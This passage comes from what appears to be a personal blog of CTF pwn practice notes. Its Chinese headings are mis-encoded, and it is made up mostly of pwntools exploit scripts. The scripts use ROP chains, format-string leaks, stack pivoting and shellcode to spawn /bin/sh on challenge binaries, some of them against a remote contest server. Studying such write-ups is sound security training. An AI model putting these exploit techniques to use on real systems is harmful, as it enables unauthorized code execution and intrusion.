p64(binsh)+ p64(system)</span><br><span class="line">p.sendafter(<span class="string">&#x27;magic&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="hopper"><a href="#hopper" class="headerlink" title="hopper"></a>hopper</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250315150516.png" alt="Pasted image 20250315150516"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rsi = <span class="number">0x401017</span>  </span><br><span class="line">syscall = <span class="number">0x40100A</span>  </span><br><span class="line">xchg = <span class="number">0x40100C</span>  </span><br><span class="line">pop_r15=<span class="number">0x40101C</span>  </span><br><span class="line">  </span><br><span class="line">gdb.attach(p)  </span><br><span class="line">pause()  </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;    (&quot; ~----( ~   Y.  )\n&#x27;</span>)  </span><br><span class="line">a = p.recvline()[:<span class="number">6</span>]  </span><br><span class="line">a = <span class="built_in">int</span>.from_bytes(a,<span class="string">&#x27;little&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---&gt;&quot;</span>,<span class="built_in">hex</span>(a))  </span><br><span class="line">payload = p64(pop_r15)+p64(pop_rsi)+p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(a+<span class="number">0x28</span>) + p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(<span class="number">59</span>) + p64(syscall)  </span><br><span class="line">payload += p64(<span class="number">0x401021</span>)+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="NPC2CTF"><a href="#NPC2CTF" class="headerlink" title="NPC2CTF"></a><strong>NPC2CTF</strong></h2><h3 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h3><h4 id="ORWï¼ˆDay1-25-2-23ï¼‰"><a href="#ORWï¼ˆDay1-25-2-23ï¼‰" class="headerlink" title="ORWï¼ˆDay1 25/2/23ï¼‰"></a>ORWï¼ˆDay1 25/2/23ï¼‰</h4><p><a href="https://blog.csdn.net/2301_79880074/article/details/136008071">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ä¸¤ç§åˆ©ç”¨å§¿åŠ¿+orwæ²™ç›’åˆ©ç”¨_æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canary-CSDNåšå®¢</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x000000000002be51 : pop rsi ; ret</span><br><span class="line">0x0000000000035dd1 : pop rbx ; ret</span><br><span class="line">0x000000000002be51 : pop rsi ; ret</span><br><span class="line">0x0000000000045eb0 : pop rax ; ret</span><br><span class="line">0x000000000002a3e5 : pop rdi ; ret</span><br><span class="line">0x00000000000904a9 : pop rdx ; pop rbx ; ret</span><br></pre></td></tr></table></figure><br><code>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; |grep &quot;rax&quot;</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]  </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./orw&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;175.27.249.18&#x27;</span>,<span class="number">31548</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc = &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">rsi=<span class="number">0x000000000002be51</span>+libc.address</span><br><span class="line">rdi=<span class="number">0x000000000002a3e5</span>+libc.address</span><br><span class="line">rdx_rbx=<span class="number">0x00000000000904a9</span>+libc.address</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000035dd1 : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000045eb0 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x00000000000904a9 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a3e5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">syscall=libc.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x403400</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">88</span></span><br><span class="line"><span class="comment">#è°ƒç”¨read(0, bss_addr, 4)è¯»å…¥&quot;flag&quot;</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line"><span class="comment">#è°ƒç”¨syscall(2,bss,0)</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"><span class="comment">#read(3(æ–‡ä»¶), bss, 0x100)</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line"><span class="comment">#puts(bss)</span></span><br><span class="line">payload+=p64(rdi)+p64(bss)+p64(puts)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="simple-shellcodeï¼ˆDay0-25-2-22ï¼‰"><a href="#simple-shellcodeï¼ˆDay0-25-2-22ï¼‰" class="headerlink" title="simple_shellcodeï¼ˆDay0 25/2/22ï¼‰"></a>simple_shellcodeï¼ˆDay0 25/2/22ï¼‰</h4><h5 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;175.27.249.18&#x27;</span>, <span class="number">30369</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#ç”Ÿæˆå¹¶æ±‡ç¼–shellcode</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;plz: &#x27;</span>, shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;175.27.249.18 30924&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = gift.elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Shellcode plz: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">add qword ptr [rsp], 0x30</span></span><br><span class="line"><span class="string">mov rsp, qword ptr [rsp]</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x424030</span></span><br><span class="line"><span class="string">mov rdx, 0x8</span></span><br><span class="line"><span class="string">mov qword ptr [rbp + 0x8], 0x4011FA</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4012CB</span></span><br><span class="line">payload = p64(elf.plt.write) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">s(asm(shellcode).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>) + payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64_ex(r(<span class="number">8</span>)) - <span class="number">0x11EA10</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, <span class="subst">&#123;<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)):#x&#125;</span></span></span><br><span class="line"><span class="string">mov rsi, <span class="subst">&#123;libc.sym.system:#x&#125;</span></span></span><br><span class="line"><span class="string">add rsp, 0x8</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s(asm(shellcode))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EZ-Stackï¼ˆDay1-25-2-23ï¼‰"><a href="#EZ-Stackï¼ˆDay1-25-2-23ï¼‰" class="headerlink" title="EZ_Stackï¼ˆDay1 25/2/23ï¼‰"></a>EZ_Stackï¼ˆDay1 25/2/23ï¼‰</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250217193308.png" alt="Pasted image 20250217193308">å¼€äº†NX<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¹Ÿè®¸æœ‰ç”¨çš„gadget</span></span><br><span class="line"><span class="number">0x000000000040117d</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401203</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x000000000040101a</span> : ret</span><br><span class="line"><span class="number">0x000000000040103a</span> : jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401194</span> : jmp <span class="number">0x401120</span></span><br><span class="line"><span class="number">0x000000000040100b</span> : jmp <span class="number">0x4840103f</span></span><br><span class="line"><span class="number">0x0000000000401217</span> : jmp <span class="number">0x48401229</span></span><br><span class="line"><span class="number">0x000000000040110c</span> : jmp rax</span><br><span class="line"><span class="number">0x000000000040101a</span> : ret</span><br><span class="line"></span><br><span class="line"><span class="number">0x000000000040127f</span> : leave ; ret</span><br></pre></td></tr></table></figure><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250218214438.png" alt="Pasted image 20250218214438"></p><h5 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h5><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libc+æ ˆè¿ç§»</p><h5 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h5><p>printfå¤„ä¸‹æ–­ç‚¹<br><code>b* 0x401254</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223144004.png" alt="Pasted image 20250223144004"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223152812.png" alt="Pasted image 20250223152812"><br><strong>6</strong></p><h5 id="æ³„éœ²rbp"><a href="#æ³„éœ²rbp" class="headerlink" title="æ³„éœ²rbp"></a>æ³„éœ²rbp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>) </span><br><span class="line">payload=<span class="string">b&#x27;AAAA&#x27;</span>+<span class="string">b&#x27;%22$p&#x27;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>) </span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAA&quot;</span>) </span><br><span class="line">rbp = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>), <span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp)) </span><br><span class="line">pause() </span><br><span class="line">buf=rbp-<span class="number">0x30</span>-<span class="number">0x80</span> </span><br><span class="line">pop_rdi=<span class="number">0x0401203</span> </span><br><span class="line">lea_ret=<span class="number">0x040127f</span> </span><br><span class="line">ret=<span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi) </span><br><span class="line">payload+=p64(puts_got) </span><br><span class="line">payload+=p64(puts_plt) </span><br><span class="line">payload+=p64(<span class="number">0x0401208</span>) </span><br><span class="line">payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">payload+=p64(buf) </span><br><span class="line">payload+=p64(lea_ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know stack pivating?&quot;</span>) p.send(payload)</span><br></pre></td></tr></table></figure><p><code>22=6+128//8</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223172641.png" alt="Pasted image 20250223172641"></p><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223173503.png" alt="Pasted image 20250223173503"><br><code>0xb0=0xb00-0xa50</code></p><h5 id="æœ¬åœ°exp"><a href="#æœ¬åœ°exp" class="headerlink" title="æœ¬åœ°exp"></a>æœ¬åœ°exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;175.27.249.18&#x27;,30150)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²libc</span></span><br><span class="line"><span class="comment"># payload1=b&#x27;AAA%8$s%9$s%10$s&#x27;+p64(puts_got)+p64(printf_got)+p64(read_got)</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;What&#x27;s your name?\n&quot;,payload1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Nice to meet you \n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=p.recv(27)</span></span><br><span class="line"><span class="comment"># puts_addr=u64(data[3:9].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># printf_addr=u64(data[9:15].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># read_addr=u64(data[15:21].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success(&quot;puts_addr: &quot;+hex(puts_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;printf_addr: &quot;+hex(printf_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;read_addr: &quot;+hex(read_addr))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ³„éœ²rbp</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;AAA%22$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">17</span>)[<span class="number">3</span>:],<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">base=<span class="number">0x00007ffff7c00000</span></span><br><span class="line">  </span><br><span class="line">bin_sh=libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">bin_addr=base+bin_sh</span><br><span class="line">pop_rdi=<span class="number">0x401203</span></span><br><span class="line">leave_ret=<span class="number">0x40127</span></span><br><span class="line">system_addr=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_rbp=rbp-<span class="number">0xb0</span>-<span class="number">8</span></span><br><span class="line">payload2= p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">128</span>-<span class="number">24</span>)+p64(fake_rbp)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Do you know stack pivating?\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="è¿œç¨‹exp"><a href="#è¿œç¨‹exp" class="headerlink" title="è¿œç¨‹exp"></a>è¿œç¨‹exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./ezstack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;175.27.249.18&#x27;</span>,<span class="number">30999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„éœ²libc</span></span><br><span class="line"><span class="comment"># payload1=b&#x27;AAA%8$s%9$s%10$s&#x27;+p64(puts_got)+p64(printf_got)+p64(read_got)</span></span><br><span class="line"><span class="comment">## fmtå¯¹åº”ç¬¬7ä¸ªï¼Œputs_gotå¯¹åº”ç¬¬8ä¸ª</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;What&#x27;s your name?\n&quot;,payload1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Nice to meet you \n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=p.recv(27)</span></span><br><span class="line"><span class="comment"># puts_addr=u64(data[3:9].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># printf_addr=u64(data[9:15].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># read_addr=u64(data[15:21].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success(&quot;puts_addr: &quot;+hex(puts_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;printf_addr: &quot;+hex(printf_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;read_addr: &quot;+hex(read_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#be0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²rbp</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;AAAAAAA%8$s%22$p&#x27;</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;rbp:&quot;</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">base=puts_addr-<span class="number">0x080e50</span></span><br><span class="line"></span><br><span class="line">bin_addr=base+<span class="number">0x1d8678</span></span><br><span class="line">pop_rdi=<span class="number">0x401203</span></span><br><span class="line">leave_ret=<span class="number">0x40127f</span></span><br><span class="line">system_addr=base+<span class="number">0x050d70</span> </span><br><span class="line"></span><br><span class="line">fake_rbp=rbp-<span class="number">0xb0</span>-<span class="number">8</span></span><br><span class="line">payload2= p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">128</span>-<span class="number">24</span>)+p64(fake_rbp)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Do you know stack pivating?\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h3><h4 id="Listï¼ˆDay2-25-2-24ï¼‰"><a href="#Listï¼ˆDay2-25-2-24ï¼‰" class="headerlink" title="Listï¼ˆDay2 25/2/24ï¼‰"></a>Listï¼ˆDay2 25/2/24ï¼‰</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250224170216.png" alt="Pasted image 20250224170216"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400acc</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span 